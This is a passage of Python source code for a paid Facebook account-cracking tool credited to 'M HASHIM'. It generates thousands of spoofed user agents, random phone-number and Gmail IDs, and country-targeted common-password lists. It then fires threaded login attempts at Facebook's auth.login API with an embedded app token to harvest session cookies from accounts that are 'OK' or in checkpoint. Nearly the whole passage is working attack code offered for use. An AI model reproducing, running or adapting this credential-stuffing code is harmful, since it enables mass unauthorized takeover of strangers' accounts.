Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; 5024D_EEA Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; motorola one action Build/RSBS31.Q1-48-36-26; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; T767H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A336B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 11; M2007J3SG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; 2201117PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; moto e(7) power Build/QOLS30.288-52-18; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; CPH2025 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; M2011K2G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2333 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-F936B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; SM-J330FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","Mozilla/5.0 (Linux; Android 11; SM-N976B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; SM-A022M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D47 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/2;FBID/phone;FBLC/ja_JP;FBOP/5]","Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; 5024D_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","TuneIn Radio/25.2.1; iPad7,6; iPadOS/16.2","Mozilla/5.0 (Linux; Android 10; BLA-L09 Build/HUAWEIBLA-L09S; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 GNews Android/2022108570","Mozilla/5.0 (Linux; Android 12; LM-G900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36 OPR/74.1.3922.71199","Mozilla/5.0 (Linux; Android 9; moto e6 play Build/POAS29.550-132-25; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A325F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Config/97.2.6611.12","Mozilla/5.0 (Linux; Android 10; SM-A920F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; SM-G960N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; 5030F_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H321 [FBAN/FBIOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.4;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]","Mozilla/5.0 (Linux; Android 8.0.0; BAH2-W19 Build/HUAWEIBAH2-W19) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606FA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 11; 1EY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 12; LM-G900 Build/SKQ1.211103.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022113898","Mozilla/5.0 (Linux; Android 12; SM-M336B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A236U1 Build/TP1A.220624.014)","Mozilla/5.0 (Linux; Android 12; RMX3461 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; W-V830-EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 7.0; AGS-L09 Build/HUAWEIAGS-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]",])

for xd in range(10000):

	aa='Mozilla/5.0 (Linux; U; Android'

	b=random.choice(['6','7','8','9','10','11','12','13'])

	c=f' en-us; {str(gt)}'

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36'

	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)

for agent in range(10000):

	aa='Mozilla/5.0 (Linux; Android 6.0.1;'

	b=random.choice(['6','7','8','9','10','11','12','13'])

	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'

	h=random.randrange(73,100)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/533.1'

	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

	ugen.append(fullagnt)

rug=[]

for nt in range(10000):

	rr=random.randint

	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	rx=random.randrange(1, 999)

	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"

	rug.append(xx)

ruz=[]

for mtc in range(10000):

	rr=random.randint

	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"

	ruz.append(xd)

	

#new ua

ugen=[]

for agent in range(10000):

        aa='Mozilla/5.0 (Linux; Android 6.0.1;'

        b=random.choice(['6','7','8','9','10','11','12'])

        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'

        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

        e=random.randrange(1, 999)

        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'

        h=random.randrange(73,100)

        i='0'

        j=random.randrange(4200,4900)

        k=random.randrange(40,150)

        l='Mobile Safari/533.1'

        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

        ugen.append(fullagnt)

sim_id = ''

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')

model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')

build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

fblc = 'en_GB'

try:

        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')

except:

        fbcr = 'Zong'

fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')

fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')

fbdv = model

fbsv = android_version

fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')

fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')

try:

        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')

        total = 0

        for i in fbcr:

                total+=1

        select = ('1','2')

        if select == '1':

                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')

                sim_id+=fbcr

        elif select == '2':

                try:

                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')

                        sim_id+=fbcr

                except Exception as e:

                        fbcr = "Zong"

                        sim_id+=fbcr

        else:

                fbcr = 'Zong'

                sim_id+=fbcr

except:

        fbcr = "Zong"

device = {

        'android_version':android_version,

        'model':model,

        'build':build,

        'fblc':fblc,

        'fbmf':fbmf,

        'fbbd':fbbd,

        'fbdv':model,

        'fbsv':fbsv,

        'fbca':fbca,

        'fbdm':fbdm}

logo=("""\033[1;91m

        \033[1;97m88888888888 8888888b. 88888888888 

          \033[1;97m  888     888   Y88b    888     

        \033[1;97m    888     888    888    888     

        \033[1;97m    888     888   d88P    888     

        \033[1;97m    888     8888888P"     888     

         \033[1;97m   888     888 T88b      888     

         \033[1;97m   888     888  T88b     888     

          \033[1;97m  888     888   T88b    888\033[1;32m       XD

\033[1;37m--------------------------------------------------

[~] Author   :  M HASHIM

[~] Facebook:M HASHIM

[~] Tool     : Paid

[~] Version  : 30.0

\033[1;37m----------------------------------------------""")

def linex():

	print('\033[1;37m----------------------------------------------')

def clear():

	os.system('clear')

	print(logo)

A = '\x1b[1;97m' 

B = '\x1b[1;96m' 

C = '\x1b[1;91m' 

D = '\x1b[1;92m'

M = '\033[1;31m'

H = '\033[1;32m'

N = '\x1b[1;37m'	

E = '\x1b[1;93m' 

F = '\x1b[1;94m'

G = '\x1b[1;95m'

P = '\033[1;37m'

def cek_apk(session,coki):

	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

	sop = BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	if len(game)==0:

		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))

	else:

		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))

		for i in range(len(game)):

			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))

	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

	sop = BeautifulSoup(w,"html.parser")

	x = sop.find("form",method="post")

	game = [i.text for i in x.find_all("h3")]

	if len(game)==0:

		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))

	else:

		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))

		for i in range(len(game)):

			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))

loop=0

oks=[]

cps=[]

pcp=[]

id=[]

tokenku=[]

def menu():

			clear()

		#	linex()

			print(' [1] File cloning\n [2] Random cloning\n [3] gmail cloning \n [4] join whatsap group \n [0] Exit menu')

			linex()

			xd=input(' Choose an option: ')

		#	os.system('xdg-open https://www.facebook.com/dr.paigham')

			if xd in ['1','01']:

				clear()

				print(' Put file example:  /sdcard/File.txt  etc..')

				linex()

				file = input(' Put file path\033[1;37m: ')

				try:

					fo = open(file,'r').read().splitlines()

				except FileNotFoundError:

					print(' File location not found ')

					time.sleep(1)

					menu()

				clear()

				print(' All method working ')

				linex()

				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) \n\033[1;33m [4]\033[1;37m Method  (for new ids)\033[1;32m   (best) \n \033[1;33m[5] \033[1;37mMethod  (for new ids) \033[1;32m  (slow) \n \033[1;33m[6] \033[1;37mMethod  (for new ids) \n \033[1;33m[7] \033[1;37mMethod  (for new ids) \n \033[1;33m[8] \033[1;37mMethod  (for new ids) ')

				linex()

				mthd=input(' Choose: ')

				linex()

				plist = []

				try:

					ps_limit = int(input(' How many passwords do you want to add ? '))

				except:

					ps_limit =1

				clear()

				print('\033[1;32m exp: first last,firtslast,first123')

				linex()

				for i in range(ps_limit):

					plist.append(input(f' Put password {i+1}: '))

				clear()

				print(' Do you went show cp account? (y/n): ')

				linex()

				cx=input(' Choose: ')

				if cx in ['y','Y','yes','Yes','1']:

					pcp.append('y')

				else:

					pcp.append('n')

				with tred(max_workers=30) as crack_submit:

					clear()

					total_ids = str(len(fo))

					print(' Total account ids : \033[1;32m'+total_ids+f' ')

					print(' \033[1;37mThe process is running in the background')

					linex()

					for user in fo:

						ids,names = user.split('|')

						passlist = plist

						if mthd in ['1','01']:

							crack_submit.submit(api1,ids,names,passlist)

						elif mthd in ['2','02']:

							crack_submit.submit(api2,ids,names,passlist)

						elif mthd in ['3','03']:

							crack_submit.submit(api3,ids,names,passlist)

						elif mthd in ['4','04']:

							crack_submit.submit(api4,ids,names,passlist)

						elif mthd in ['5','05']:

							crack_submit.submit(api5,ids,names,passlist)

						elif mthd in ['6','06']:

							crack_submit.submit(api6,ids,names,passlist)

						elif mthd in ['7','07']:

							crack_submit.submit(api7,ids,names,passlist)

						elif mthd in ['8','08']:

							crack_submit.submit(api8,ids,names,passlist)

				print('\033[1;37m')

				linex()

				print(' The process has completed')

				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))

				linex()

				input(' Press enter to back ')

				os.system('python trt.py')

			elif xd in ['2','02']:

				pak()

			elif xd in ['3','03']:

				gmail()

				#create()

				#dz._login()

				exit()

			elif xd in ['4','04']:

				os.system('xdg-open fb://group/1313156185697632?ref=share&mibextid=NSMWBT' )

				menu()

			elif xd in ['0','00']:

				exit(' Thanks for use 🥰 ')

			else:

				exit(' Option not found in menu...')

		

def pak():

		user=[]

		clear()

		print('\033[1;35m Code example: 0306,0315,0335,0345')

		code = input('\033[1;37m put code: ')

		try:

			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))

		except ValueError:

			limit = 5000

		clear()

		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (with cokies) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')

		linex()

		mthd = input(' Choose: ')

		clear()

		print('\033[1;32m [1] \033[1;33mClone with 7+11 digit pass (v-fast) \n\033[1;32m [2]\033[1;33m Clone with auto pass (best) \n\033[1;32m [3]\033[1;33m Clone with auto pass (fast)\n\033[1;32m [5] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [5] \033[1;33mClone with auto pass (slow-fast) \n\033[1;32m [6] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [7] \033[1;33mClone with auto pass (only-BD) \n\033[1;32m [8] \033[1;33mClone with auto pass (only-AFG) ')

		linex()

		pcs = input(' [?] Select: ')

		for nmbr in range(limit):

			nmp = ''.join(random.choice(string.digits) for _ in range(7))

			user.append(nmp)

		with tred(max_workers=30) as TRT:	

			clear()

			tl = str(len(user))

			print(' Total ids : \033[1;32m'+tl+f' ')

			print(f'\033[1;37m Choice code  :\033[1;32m '+code)

			print(' \033[1;37mThe process is running in the background')

			linex()

			for psx in user:

				ids = code+psx

				if pcs in ['1','01']:

					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']

				if pcs in ['2','02']:

					passlist = [psx,ids,'khankhan','khan1122','ali12345','pakistan','khan12345','ali1122','baloch12345','khan','baloch','khan','pubg','pubg1122','malik786']

				elif pcs in ['3','03']:

					passlist = [psx,ids,'pubg','pubg1122','pubgking','pubg12','pubg123','pubg1234']

				elif pcs in ['4','04']:

					passlist = [psx,ids,'khankhan','khan1122','khan1234','khan123']

				elif pcs in ['5','05']:

					passlist = [psx,ids]

				elif pcs in ['6','06']:

					passlist = [psx,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']

				elif pcs in ['7','07']:

					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']

				elif pcs in ['8','08']:

					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']

				if mthd in ['1','01']:

					TRT.submit(trt1,ids,passlist)

				if mthd in ['2','02']:

					TRT.submit(trt2,ids,passlist)

				if mthd in ['3','03']:

					TRT.submit(trt3,ids,passlist)

				if mthd in ['4','04']:

					TRT.submit(trt4,ids,passlist)

				if mthd in ['5','05']:

					TRT.submit(trt5,ids,passlist)

				if mthd in ['6','06']:

					TRT.submit(trt6,ids,passlist)

		print('\033[1;37m')

		linex()

		print(' The process has completed')

		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))

		linex()

		input(' Press enter to back ')

		os.system('python trt.py')

def gmail():

		os.system('rm -rf .re.txt')

		clear()

		print('\033[1;37m example: ramzan, ali, sajjad, faizan\033[1;97m')

		linex()

		first = input(' Put first name: ')

		linex()

		print('\033[1;37m example: khan, ahmad, ali \033[1;97m')

		linex()

		last = input(' Put last name: ')

		linex()

		print(' Example: @gmail.com ')

		linex()

		domain = input(' domain: ')

		linex()

		try:

			limit=int(input(' Put limit: '))

		except ValueError:

			limit = 5000

		clear()

		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')

		linex()

		pxc = input(' Choose : ')

		clear()

		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (slow) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')

		linex()

		mthd = input(' Choose: ')

		linex()

		print(' Getting gmails...')

		lists = ['3','4']

		for xd in range(limit):

			lchoice = random.choice(lists)

			if '3' in lchoice:

				mail = ''.join(random.choice(string.digits) for _ in range(3))

				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')

			else:

				mail = ''.join(random.choice(string.digits) for _ in range(4))

				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')

			fo = open('.re.txt', 'r').read().splitlines()

		with tred(max_workers=30) as TRT:

			total = str(len(fo))

			clear()

			print(' Total ids : \033[1;32m'+total+f' ')

			print(' \033[1;37mThe process is running in the background')

			linex()

			for user in fo:

				ids,names = user.split('|')

				first_name = names.rsplit(' ')[0]

				try:

					last_name = names.rsplit(' ')[1]

				except IndexError:

					last_name = 'Khan'

				fs = first_name.lower()

				ls = last_name.lower()

				if pxc in ['1','01']:

					passlist = [fs+ls,fs+' '+ls,fs]

				elif pxc in ['2','02']:

					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']

				elif pxc in ['3','03']:

					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']

				else:

					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']

				if mthd in ['1','01']:

					TRT.submit(trt1,ids,passlist)

				if mthd in ['2','02']:

					TRT.submit(trt2,ids,passlist)

				if mthd in ['3','03']:

					TRT.submit(trt3,ids,passlist)

				if mthd in ['4','04']:

					TRT.submit(trt4,ids,passlist)

				if mthd in ['5','05']:

					TRT.submit(trt5,ids,passlist)

				if mthd in ['6','06']:

					TRT.submit(trt6,ids,passlist)

		print('\033[1;37m')

		linex()

		print(' The process has completed')

		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))

		linex()

		input(' Press enter to back ')

		os.system('python trt.py')

#b-api method

#1method

def api1(ids,names,passlist):

		try:

			global ok,loop

			sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

			fn = names.split(' ')[0]

			try:

				ln = names.split(' ')[1]

			except:

				ln = fn

			for pw in passlist:

				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())

				

				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))

				application_version_code=str(random.randint(000000000,999999999))

				__iam_genius = random.choice(android_models)

				phone_model = __iam_genius.split('|')[0]

				phone_company = __iam_genius.split('|')[1]

				dimensions = __iam_genius.split('|')[2]

				ffb=random.choice(fbks)

				dvlk = random.choice(usr)

				ua_string = f'[FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'

				li = ['28','29','210']

				li2 = random.choice(li)

				j1 = ''.join(random.choice(digits) for _ in range(2))

				j2 = li2+j1

				device_family_id = str(uuid.uuid4())

				adid = str(uuid.uuid4())

				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))

				data = {'adid':adid,

				'format':'json',

				'device_id':device_family_id,

				'email':ids,

				'password':pas,

				'generate_analytics_claim':'1',

				'community_id':'','cpl':'true','try_num':'1',

				'family_device_id':device_family_id,

				'credentials_type':'device_based_login_password',

				'generate_session_cookies':'1',

				'error_detail_type':'button_with_disabled',

				'source':'device_based_login',

				'machine_id':machine_id,

				'login_location_accuracy_m':'1.0',

				'meta_inf_fbmeta':'',

				'advertiser_id':adid,

				'encrypted_msisdn':'',

				'currently_logged_in_userid':'0',

				'locale':'en_PK',

				'client_country_code':'PK',

				'method':'auth.login',

				'fb_api_req_friendly_name':'authenticate',

				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',

				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}

				head = {

				'content-type':'application/x-www-form-urlencoded',

				'x-fb-sim-hni':str(random.randint(2e4,4e4)),

				'x-fb-connection-type':'unknown',

				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',

				'user-agent':aqib_ua,

				'x-fb-net-hni':str(random.randint(2e4,4e4)),

				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),

				'x-fb-connection-quality':'EXCELLENT',

				'x-fb-friendly-name':'authenticate',

				'accept-encoding':'gzip, deflate',

				'x-fb-http-engine':	'Liger'}

				url = 'https://b-api.facebook.com/method/auth.login'

